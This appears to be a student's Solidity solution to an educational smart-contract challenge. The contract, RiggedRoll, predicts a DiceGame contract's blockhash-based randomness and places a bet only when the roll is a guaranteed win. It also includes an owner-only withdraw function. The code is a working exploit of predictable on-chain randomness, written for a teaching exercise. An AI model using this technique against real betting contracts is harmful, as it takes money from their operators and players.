pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;


    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address payable to, uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Insufficient balance");
        to.transfer(amount);
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
  function riggedRoll() external {
    uint256 betAmount = 0.002 ether; 

    // Check contract balance with if/revert instead of require
    if (address(this).balance < betAmount) {
        revert("Contract lacks funds");
    }

    // Calculate the roll
    uint256 nonce = diceGame.nonce();
    bytes32 prevHash = blockhash(block.number - 1);
    bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
    uint256 roll = uint256(hash) % 16;

    // Check roll with if/revert instead of require
    if (roll > 5) {
        revert("Not a winning roll!");
    }

    // Initiate the roll
    (bool success, ) = address(diceGame).call{value: betAmount}(
        abi.encodeWithSignature("rollTheDice()")
    );

    // Check call success with if/revert instead of require
    if (!success) {
        revert("Roll failed");
    }
}
    // Include the `receive()` function to enable the contract to receive incoming Ether.

    receive() external payable {}
}
